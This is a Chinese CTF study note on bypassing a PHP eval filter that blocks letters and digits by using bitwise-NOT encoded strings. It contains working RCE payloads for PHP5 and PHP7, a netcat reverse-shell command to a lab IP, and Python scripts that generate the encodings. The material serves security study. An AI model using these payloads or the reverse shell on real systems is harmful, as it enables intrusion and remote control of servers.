---
title: 命令执行 | 无字母数字取反绕过
date: 2026-04-21 20:00:00 +0800
categories: [笔记]
tags: [命令执行, 无字母数字RCE]
mermaid: true
---

## 题目
---

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

if (!preg_match('/[a-z0-9]/is', $_GET['cmd'])){
	eval($_GET['cmd']);
}
```


## 情形一：PHP5
---

预期指令

`assert($_POST[_]);`

构造原理

```php
<?php

$_ = ~"%9e%8c%8c%9a%8d%8b";  // 'assert'取反
$__ = ~"%0a%af%b0%ac%ab";    // '_POST'取反
$___ = $$__;
$_($___[_]);

```

payload
```text

?cmd=$_=~("%9e%8c%8c%9a%8d%8b");$__=~("%0a%af%b0%ac%ab");$___=$$__;$_($___[_]);

由于里边没有`+`字符，故不需要URL编码

`_=phpinfo();`
```


## 情形二：php7
---

预期指令

``` `$_POST[_]`; ```

构造原理

```php
<?php

$__ = ~"%0a%af%b0%ac%ab";
$___ = $$__;
`$___[_]`;

```
payload
```text
?cmd=$__=~("%0a%af%b0%ac%ab");$___=$$__;`$___[_]`;

`nc -lvp 7777`

`_=nc 192.168.1.161 7777 -e /bin/bash`
```


## 按位取反编码脚本

### 脚本一：更专业

```mermaid
flowchart LR
A[待加密字符串] -->|转字节| B
B -->|按位取反| C
C -->|转 % 格式| D[加密字符串]
```


```python
# 目标：把 assert 加密成 URL 编码格式 %9e%8c%8c%9a%8d%8b

# 1. 原始字符串
plain = "assert"

# 2. 转成字节数组
data = plain.encode("latin-1")

# 3. 每个字节按位取反（和 PHP ~ 效果一样）
not_bytes = bytes([~b & 0xFF for b in data])

# 4. 转成 URL 编码（最终加密结果）
def byte_to_hex(c):
    return f"%{c:02x}"

encrypted = "".join([byte_to_hex(b) for b in not_bytes])

# 输出结果
print("加密结果：", encrypted)
```

### 脚本二：更直接
```python
plain = "assert"

# 1. 字符串 → 数字列表（只这里需要 encode）
nums = [ord(c) for c in plain]

# 2. 按位取反
not_nums = [~x & 0xFF for x in nums]

# 3. 数字 → %xx 直接转！根本不用 bytes！！
result = ''.join(f'%{x:02x}' for x in not_nums)

print(result)  # %9e%8c%8c%9a%8d%8b
```